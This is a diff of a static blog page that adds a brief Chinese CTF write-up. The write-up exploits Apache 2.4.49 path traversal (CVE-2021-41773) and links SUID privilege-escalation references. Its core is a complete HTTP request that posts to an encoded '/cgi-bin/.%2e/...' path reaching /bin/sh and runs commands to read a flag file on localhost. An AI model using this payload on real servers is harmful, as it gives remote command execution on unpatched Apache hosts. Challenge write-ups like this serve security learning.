@@ -71,10 +71,10 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-hackmepls" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2022/02/22/1/" class="article-date">
-  <time class="dt-published" datetime="2022-02-22T15:09:42.006Z" itemprop="datePublished">2022-02-22</time>
+    <a href="/2022/02/22/hackmepls/" class="article-date">
+  <time class="dt-published" datetime="2022-02-22T15:41:17.701Z" itemprop="datePublished">2022-02-22</time>
 </a>
     
   </div>
@@ -83,11 +83,26 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        
+        <h1 id="hack-me-pls"><a href="#hack-me-pls" class="headerlink" title="hack me pls ~~"></a>hack me pls ~~</h1><p>搜集信息：</p>
+<ul>
+<li><p><code>apache v2.4.49 </code> </p>
+</li>
+<li><p>通过 <code>/cgi-bin/</code> 可以读 apache 的 配置文件 <code>/usr/local/apache2/conf/httpd.conf</code>，从而确定符合 <code>CVE-2021-41773</code> 的利用条件</p>
+</li>
+</ul>
+<p>先 rce ：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2021-41773">https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2021-41773</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/1nhann/CVE-2021-41773">https://github.com/1nhann/CVE-2021-41773</a></p>
+<p>然后suid提权：</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html">https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html</a></p>
+<p>payload ：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:12345</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>curl/7.68.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>56</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-bash"><span class="built_in">echo</span> Content-Type: text/plain; <span class="built_in">echo</span>; rev /flaggggggg.txt</span></span><br></pre></td></tr></table></figure>
+
+
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/02/22/1/" data-id="ckzy9l7be0002vov66ja378j4" data-title="" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/02/22/hackmepls/" data-id="ckzyaqe2r0000wov6btrv9zn0" data-title="" class="article-share-link">Share</a>
       
       
       
@@ -127,7 +142,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/02/22/sql_wp/" data-id="ckzy9l7bd0001vov63abn3q1x" data-title="" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/02/22/sql_wp/" data-id="ckzyaqe2x0002wov67rljb9ie" data-title="" class="article-share-link">Share</a>
       
       
       
@@ -178,7 +193,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/02/22/hello-world/" data-id="ckzy9l7b90000vov60p1va9vt" data-title="Hello World" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/02/22/hello-world/" data-id="ckzyaqe2v0001wov68lh135ua" data-title="Hello World" class="article-share-link">Share</a>
       
       
       
@@ -221,7 +236,7 @@
       <ul>
         
           <li>
-            <a href="/2022/02/22/1/">(no title)</a>
+            <a href="/2022/02/22/hackmepls/">(no title)</a>
           </li>
         
           <li>
